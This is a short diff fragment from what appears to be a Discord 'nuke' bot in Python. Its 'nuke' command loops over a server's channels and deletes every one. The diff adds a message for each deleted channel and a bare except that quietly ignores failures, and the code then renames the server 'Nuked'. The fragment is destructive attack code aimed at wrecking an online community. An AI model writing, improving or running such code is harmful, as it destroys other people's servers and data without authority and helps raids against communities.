@@ -35,6 +35,9 @@ async def nuke (ctx):
     for channel in list(ctx.message.guild.channels):
         try:
             await channel.delete()
+            print(f"{channel.name} has been deleted")
+        except:
+             pass
     for i in range(1):
         await ctx.guild.edit("Nuked")
     for i in range(1):
